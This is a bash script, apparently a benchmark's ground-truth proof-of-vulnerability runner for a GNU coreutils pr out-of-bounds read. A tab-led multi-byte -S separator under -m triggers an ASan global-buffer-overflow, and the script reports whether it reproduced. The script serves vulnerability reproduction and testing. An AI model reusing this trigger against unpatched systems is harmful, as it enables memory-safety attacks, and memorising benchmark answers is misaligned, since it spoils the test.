#!/usr/bin/env bash
# Ground-truth POV runner for coreutils__coreutils_gnubug-25023_ca99c524e828
# (gnubug-25023, CWE-125).
#
# Drives the real `pr` binary (built by the manifest build_command as src/pr)
# with a column separator that *starts with a tab and is longer than one byte*,
# under -m (parallel merge of two files -> multiple columns). init_parameters()
# repoints col_sep_string at the 1-byte " " global column_separator whenever the
# first byte is '\t', but leaves col_sep_length at the -S string's real length,
# so print_sep_string() walks past the 1-byte buffer (global-buffer-overflow).
#
# Exit codes (ground-truth contract):
#   0 -> vulnerability reproduced (ASan global-buffer-overflow in pr)
#   1 -> blocked / did not reproduce
#   2 -> harness/build error (never 1 -- a broken harness must not look "blocked")
set -uo pipefail

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" &>/dev/null && pwd)"
pr_bin="./src/pr"

if [ ! -x "$pr_bin" ]; then
  echo "[gtpov] src/pr not built -- build_command must run first" >&2
  exit 2
fi

mode="${1:-tabs_only}"
case "$mode" in
  tabs_only) sep=$'\t\t\t';;
  tab_mixed) sep=$'\tXX';;
  *)
    echo "[gtpov] unknown mode: $mode (expect tabs_only|tab_mixed)" >&2
    exit 2
    ;;
esac

export ASAN_OPTIONS="${ASAN_OPTIONS:-abort_on_error=1:detect_leaks=0}"
export LSAN_OPTIONS="${LSAN_OPTIONS:-detect_leaks=0}"

tmpdir="$(mktemp -d)" || { echo "[gtpov] mktemp failed" >&2; exit 2; }
trap 'rm -rf "$tmpdir"' EXIT

printf 'aaa\nbbb\nccc\n' > "$tmpdir/in1"
printf 'xxx\nyyy\nzzz\n' > "$tmpdir/in2"

out="$("$pr_bin" "-S$sep" "$tmpdir/in1" -m "$tmpdir/in2" 2>&1)"
status=$?

if printf '%s' "$out" | grep -q "AddressSanitizer: global-buffer-overflow"; then
  echo "[gtpov] reproduced: ASan global-buffer-overflow in pr (mode=$mode)" >&2
  exit 0
fi

echo "[gtpov] did not reproduce (pr exit=$status, mode=$mode)" >&2
printf '%s\n' "$out" >&2
exit 1
